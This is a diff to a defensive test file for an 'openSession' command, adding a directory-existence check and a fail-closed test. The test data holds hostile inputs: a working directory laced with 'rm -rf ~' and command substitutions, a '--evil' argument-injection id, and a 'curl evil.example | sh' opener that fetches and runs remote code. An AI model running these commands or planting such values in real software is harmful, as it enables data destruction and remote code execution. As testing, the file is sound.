@@ -1,3 +1,6 @@
+import { randomUUID } from "node:crypto";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import { describe, expect, it, vi } from "vitest";
 import { openSession } from "../../src/commands/open-session.ts";
 
@@ -9,9 +12,13 @@ import { openSession } from "../../src/commands/open-session.ts";
 //   result:   { status: "copy-only" | "opened", sessionId, cwd }
 //           | { status: "failed", reason: "invalid-value" | "spawn-failed", message, sessionId, cwd }
 //   It never throws for a bad value or a spawn failure.
+//   isDirectory?: (path) => Promise<boolean>  (injectable; when omitted openSession uses the real
+//   fs.stat check, defaultIsDirectory, and fails closed). Tests that use the fake cwd
+//   /Users/dev/repo (absent on this machine) with a {cwd} template inject `async () => true`.
 
 const NASTY_CWD = "/tmp/; rm -rf ~ $(whoami) `id` | & > \"' *";
 const request = { sessionId: "sess-1", cwd: "/Users/dev/repo" };
+const isDirectory = async (_path: string) => true;
 
 function fakeExecFile() {
   return vi.fn<
@@ -34,6 +41,7 @@ describe("openSession: configured opener", () => {
     const result = await openSession(request, {
       config: { sessionOpener: ["/usr/bin/open", "-a", "Terminal", "{cwd}", "--id={sessionId}"] },
       execFile,
+      isDirectory,
     });
     expect(execFile).toHaveBeenCalledTimes(1);
     const [file, args] = execFile.mock.calls[0] ?? [];
@@ -46,7 +54,11 @@ describe("openSession: configured opener", () => {
     const execFile = fakeExecFile();
     await openSession(
       { sessionId: "sess-1", cwd: NASTY_CWD },
-      { config: { sessionOpener: ["open", "-a", "Terminal", "{cwd}", "--dir={cwd}"] }, execFile },
+      {
+        config: { sessionOpener: ["open", "-a", "Terminal", "{cwd}", "--dir={cwd}"] },
+        execFile,
+        isDirectory,
+      },
     );
     expect(execFile).toHaveBeenCalledTimes(1);
     const [file, args, options] = execFile.mock.calls[0] ?? [];
@@ -63,7 +75,11 @@ describe("openSession: values the opener rejects", () => {
     const execFile = fakeExecFile();
     const result = await openSession(
       { sessionId: "--evil", cwd: "/Users/dev/repo" },
-      { config: { sessionOpener: ["open", "-a", "Terminal", "{cwd}", "{sessionId}"] }, execFile },
+      {
+        config: { sessionOpener: ["open", "-a", "Terminal", "{cwd}", "{sessionId}"] },
+        execFile,
+        isDirectory,
+      },
     );
     expect(execFile).not.toHaveBeenCalled();
     expect(result).toMatchObject({ status: "failed", reason: "invalid-value" });
@@ -74,10 +90,21 @@ describe("openSession: values the opener rejects", () => {
     const execFile = fakeExecFile();
     const result = await openSession(
       { sessionId: "sess-1", cwd: "relative/dir" },
-      { config: { sessionOpener: ["open", "{cwd}"] }, execFile },
+      { config: { sessionOpener: ["open", "{cwd}"] }, execFile, isDirectory },
     );
     expect(execFile).not.toHaveBeenCalled();
     expect(result).toMatchObject({ status: "failed", reason: "invalid-value" });
+  });
+
+  it("fails closed: with a {cwd} template and no isDirectory supplied, a cwd that does not exist is refused and nothing runs", async () => {
+    const execFile = fakeExecFile();
+    const missing = join(tmpdir(), `open-session-missing-${randomUUID()}`);
+    const result = await openSession(
+      { sessionId: "sess-1", cwd: missing },
+      { config: { sessionOpener: ["open", "{cwd}"] }, execFile },
+    );
+    expect(execFile).not.toHaveBeenCalled();
+    expect(result).toMatchObject({ status: "failed", reason: "invalid-value", cwd: missing });
   });
 });
 
@@ -90,7 +117,11 @@ describe("openSession: the template comes only from engine config", () => {
       opener: ["/bin/sh", "-c", "curl evil.example | sh"],
       sessionOpener: ["/bin/sh", "-c", "curl evil.example | sh"],
     };
-    await openSession(hostile, { config: { sessionOpener: ["open", "{cwd}"] }, execFile });
+    await openSession(hostile, {
+      config: { sessionOpener: ["open", "{cwd}"] },
+      execFile,
+      isDirectory,
+    });
     expect(execFile).toHaveBeenCalledTimes(1);
     expect(execFile.mock.calls[0]?.[0]).toBe("open");
     expect(execFile.mock.calls[0]?.[1]).toEqual(["/Users/dev/repo"]);
@@ -116,6 +147,7 @@ describe("openSession: spawn failures", () => {
     const result = await openSession(request, {
       config: { sessionOpener: ["/opt/opener", "--token=tok_SECRET_123", "{cwd}"] },
       execFile,
+      isDirectory,
     });
     expect(execFile).toHaveBeenCalledTimes(1);
     expect(result).toMatchObject({ status: "failed", reason: "spawn-failed" });
